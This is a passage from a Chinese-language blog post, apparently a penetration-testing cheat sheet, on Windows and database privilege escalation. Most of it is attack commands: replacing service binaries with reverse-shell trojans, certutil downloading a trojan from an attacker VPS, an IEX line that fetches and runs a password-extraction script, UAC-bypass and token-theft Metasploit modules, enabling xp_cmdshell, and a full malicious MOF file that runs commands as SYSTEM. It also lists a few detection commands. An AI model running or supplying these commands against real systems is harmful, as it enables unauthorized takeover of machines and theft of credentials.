class="hljs-meta prompt_">#</span><span class="language-bash">查看指定目录的权限配置情况</span><br>accesschk.exe -dqv &quot;D:\test&quot; -accepteula<br>参数说明：“M”表示修改，“F”代表完全控制，“CI”代表从属容器将继承访问控制项，“OI”代表从属文件将继承访问控制项。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">检查服务 如果是.SERVICE_ALL_ACCESS的意思是我们对“Vulnerable Service”的属性拥有完全控制权</span><br>accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula<br>sc qc 服务名   #查看可以完全控制的服务的属性<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">schtask 查询</span><br>schtasks /query /fo LIST 2&gt;nul<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">powershell</span><br>Get-ScheduledTask<br></code></pre></td></tr></table></figure><h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">把服务启动的行为（exe或者脚本，com组件..）替换成我们的MSF反弹木马，当服务重启时，就会给我们返回一个system权限的meterpreter</span><br>set AutoRunScript migrate -f#正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程<br>为什么要自动迁移？<br>这是因为当一个服务在Windows系统中启动后，它必须和服务控制管理器通信，如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程，我们所有需要做的就是在终止载荷进程之前，将它迁移到其它进程。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">run exploit/windows/local/service_permissions</span><br>run exploit/windows/local/service_permissions<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">找到我们具有完全控制权限的服务，修改服务配置执行命令</span><br>sc config 服务名 binpath = &quot;木马程序.exe&quot;   #INARY_PATH_NAME参数指向了该服务的可执行程序<br>sc stop 服务名<br>sc start 服务名<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">进行筛选 删除包含/Microsoft/Windows/路径的所有任务</span><br>Get-ScheduledTask | Select * | ? &#123;($_.TaskPath -notlike &quot;\Microsoft\Windows\*&quot;) -And ($_.Principal.UserId -notlike &quot;*$env:UserName*&quot;)&#125; | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @&#123;Name=&quot;User&quot;;Expression=&#123;$_.Principal.userID&#125;&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">分析计划任务  查找行为，比如exe，脚本什么的</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">task= Get-ScheduledTask -TaskName 计划任务名</span> <br>ForEach ($triger in $task.Triggers) &#123; echo $triger.Repetition.Interval&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查找计划任务行为所在目录，低权限用户是否具有可写权限  accesschk.exe  当然也可以用icacls命令</span><br>accesschk64.exe -accepteula -wv lowuser C:\ScheduledTasks\Task1\1111.exe<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">直接替换</span><br>certutil -urlcache -split -f &quot;http://你的vps/1111.exe&quot; C:\ScheduledTasks\Task1\1111.exe<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">等待计划任务执行</span><br><br>这里可以用木马程序可以用exe，任意脚本，dll文件等等，具体情况具体分析<br></code></pre></td></tr></table></figure><h4 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h4><blockquote><p>服务的可执行文件的路径没有双引号且包含空格,Windows会尝试寻找并执行名字与空格前的名字匹配的程序</p></blockquote><h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">wmi查找含有漏洞的服务命令</span><br>wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr/i /v &quot;&quot;&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">PowerUp脚本</span><br>https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp<br>powershell.exe -exec bypass -Command &quot;&amp;&#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#查看指定目录的权限配置情况</span></span><br>accesschk.exe -dqv &quot;D:\test&quot; -accepteula<br></code></pre></td></tr></table></figure><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">msf攻击模块</span><br>exploit/windows/local/trusted_service_path<br>set AutoRunScript migrate -f<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">手动攻击</span><br>我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下<br>然后重启服务<br>sc stop service_name<br>sc start service_name<br></code></pre></td></tr></table></figure><h4 id="不安全的注册表权限配置"><a href="#不安全的注册表权限配置" class="headerlink" title="不安全的注册表权限配置"></a>不安全的注册表权限配置</h4><blockquote><p>如果低权限用户对”HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\服务名\ImagePath”这个键值有写权限即可以控制这个服务</p></blockquote><h5 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">微软的工具</span><br>https://www.microsoft.com/en-us/download/search.aspx?q=subinacl<br>subinacl.exe /key reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\服务名&quot; /display<br></code></pre></td></tr></table></figure><h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">如果我们对注册表有写入权限，就可以修改注册表，使得服务启动时运行我们的恶意程序</span><br>reg add &quot;HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesVulnerable Service360rp&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:programdataadduser.exe&quot; /f<br></code></pre></td></tr></table></figure><h4 id="启用注册表键AlwaysInstallElevated"><a href="#启用注册表键AlwaysInstallElevated" class="headerlink" title="启用注册表键AlwaysInstallElevated"></a>启用注册表键AlwaysInstallElevated</h4><blockquote><p>AlwaysInstallElevated策略允许用户以System权限运行安装文件</p></blockquote><h5 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">PowerUp</span><br>powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated&#125;&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">当然也可以查看注册表键值是否被定义</span><br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure><h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">利用方法,启用AlwaysInstallElevated后，可以通过命令行调用msiexec安装msi文件，msi文件内包含要执行的Payload，Payload将会以System权限执行</span><br>msiexec /quiet /qn /i muma.msi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">msf   需要一个会话</span><br>run exploit/windows/local/always_install_elevated<br></code></pre></td></tr></table></figure><h3 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h3><h4 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h4><blockquote><p>AD里面一个存储域公共文件服务器副本的共享文件夹，所有认证用户都可以读取;SYSVOL在所有域控里进行自动同步和共享</p></blockquote><p><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\ #所有组策略均存储在如下位置</code></p><h4 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h4><blockquote><p>存储和使用凭据</p></blockquote><h5 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">Powershell获取cpassword</span><br>Get-GPPPassword.ps1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">PowerSploit 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。</span><br>powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword<br>kali gpp-decrypt命令破解密码<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Msf</span><br>run post/windows/gather/credentials/gpp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Empire</span><br>usemodule privesc/gpp<br></code></pre></td></tr></table></figure><h3 id="bypassUAC提权"><a href="#bypassUAC提权" class="headerlink" title="bypassUAC提权"></a>bypassUAC提权</h3><blockquote><p>UAC:用户账户控制，Windows的一个安全功能，支持防止对操作系统进行未授权的修改,UAC确保仅在管理员授权的情况下进行某些更改</p></blockquote><h4 id="没有管理员权限无法完成的操作"><a href="#没有管理员权限无法完成的操作" class="headerlink" title="没有管理员权限无法完成的操作"></a>没有管理员权限无法完成的操作</h4><ul><li>注册表修改</li><li>加载设备驱动程序</li><li>DLL注入</li><li>修改系统时间</li><li>修改用户账户控制设置</li><li>修改受保护的目录</li><li>计划任务</li></ul><p>####利用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">MSF</span><br>exploit/wondows/local/ask  #弹出UAC确认窗口，点击后获得system权限<br>exploit/windows/local/bypassuac#通过进程注入使用可信任发布者绕过Windows UAC,生成关闭UAC标志的第二个shell<br>exploit/windows/local/bypass_injection#通过进程注入使用可信任发布者绕过Windows UAC<br>exploit/windows/local/bypass_fodhelper#通过当前用户配置单元下劫持注册表中特殊的键并插入将在启动Windows事件查看器/fodhelper.exe 应用程序时调用自定义命令来绕过UAC<br>exploit/windows/local/bypass_eventvwr#与上一个一致，调用注册表项在调用payload清除该项，不需要payload的体系架构和操作系统匹配<br>exploit/windows/local/bypassuac_comhijack#通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">POWERSHELL</span><br>Invoke-PsUACme<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Empire</span><br>usemodule privesc/bypassuac<br>usemodule privesc/bypassuac_wscript<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">cs</span><br>uac-dll<br>uac-token-duplication<br></code></pre></td></tr></table></figure><h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">MSF</span><br>use incognito#进入incognito模块<br>list_tokens -u#列出令牌<br>Delegation Token#授权令牌<br>Impresonation Token#模拟令牌<br><br>impresonate_Token &quot;令牌名&quot;<br></code></pre></td></tr></table></figure><h5 id="Potato家族提权"><a href="#Potato家族提权" class="headerlink" title="Potato家族提权"></a>Potato家族提权</h5><h6 id="Origin-Potato-MS08-068"><a href="#Origin-Potato-MS08-068" class="headerlink" title="Origin Potato(MS08-068)"></a>Origin Potato(MS08-068)</h6><h6 id="Hot-Potato-MS16-075"><a href="#Hot-Potato-MS16-075" class="headerlink" title="Hot Potato(MS16-075)"></a>Hot Potato(MS16-075)</h6><blockquote><p>基于NTLM反射的权限的攻击方式，可以从主机最低用户权限提升至system，其中将利用ntlm relay(http-&gt;smb)和nbns欺骗，获取windows最高权限</p></blockquote><h6 id="Rotten-Potato-MS16-075变种"><a href="#Rotten-Potato-MS16-075变种" class="headerlink" title="Rotten Potato(MS16-075变种)"></a>Rotten Potato(MS16-075变种)</h6><blockquote><p>CVE-2020-0668<br>CVE-2020-0683 MSI Package Symbolic Links Processing - Windows 10 Privilege Escalation<br>CVE-2020-8950<br>CVE-2020-0683<br>CVE-2019-1002101<br>CVE-2019-0986<br>CVE-2018-1088</p></blockquote><blockquote><p><a href="https://github.com/breenmachine/RottenPotatoNG/">https://github.com/breenmachine/RottenPotatoNG/</a><br><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></blockquote><h6 id="Juicy-Potato"><a href="#Juicy-Potato" class="headerlink" title="Juicy Potato"></a>Juicy Potato</h6><blockquote><p><a href="https://github.com/shanfenglan/test/tree/master/juicypotato">https://github.com/shanfenglan/test/tree/master/juicypotato</a><br>1.使用powershell脚本找到可用的CLSID<br><code>SHELL PowerShell.exe -ExecutionPolicy Bypass -File 1.ps1 &gt; CLSID.list</code><br>2.使用bat文件确定能利用的CLSID,bat文件需与clsid.list文件放在同一目录下执行，生成result.log文件<br>3.juicypotato工具下载<br><code>SHELL JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c result.log文件中的内容</code></p></blockquote><h6 id="Sweet-Potato"><a href="#Sweet-Potato" class="headerlink" title="Sweet Potato"></a>Sweet Potato</h6><blockquote><p><a href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a><br><code>SHELL SweetPotato.exe -a &quot;whoami&quot;</code></p></blockquote><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><blockquote><p>启用xp_shell</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs MSSQL">select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)#查询是否为sysadmin用户，sysadmin执行命令继承了数据库的权限，前提在windows下，数据库(旧版本，新版本默认降权)默认没有被降权,默认就是system权限<br><br>EXEC sp_configure &#x27;show advanced options&#x27;,1<br>GO<br>RECONFIGURE<br>GO<br>EXEC sp_configure &#x27;xp_cmdshell&#x27;,1<br>GO<br>RECONFIGURE<br>GO<br><br>exec master..xp_cmdshell &quot;whoami&quot; --<br></code></pre></td></tr></table></figure><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><blockquote><p>Windows&lt;&#x3D;2003<br>Mysql在C:&#x2F;Windows&#x2F;system32&#x2F;mof目录有写权限</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs MYSQL">#mysql语句将恶意mov文件替换nullevt.mof，需先上传<br>select load_file(&quot;hacker.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;<br><br>mof文件样本<br>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)<br>instance of __EventFilter as $EventFilter<br>&#123;<br>EventNamespace = &quot;Root\\Cimv2&quot;;<br>Name = &quot;filtP2&quot;;<br>Query = &quot;Select * From __InstanceModificationEvent &quot;<br>&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;<br>&quot;And TargetInstance.Second = 5&quot;;<br>QueryLanguage = &quot;WQL&quot;;<br>&#125;;<br>instance of ActiveScriptEventConsumer as $Consumer<br>&#123;<br>Name = &quot;consPCSV2&quot;;<br>ScriptingEngine = &quot;JScript&quot;;<br>ScriptText =<br>&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;命令\&quot;)&quot;;<br>&#125;;<br>instance of __FilterToConsumerBinding<br>&#123;<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>权限提升</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
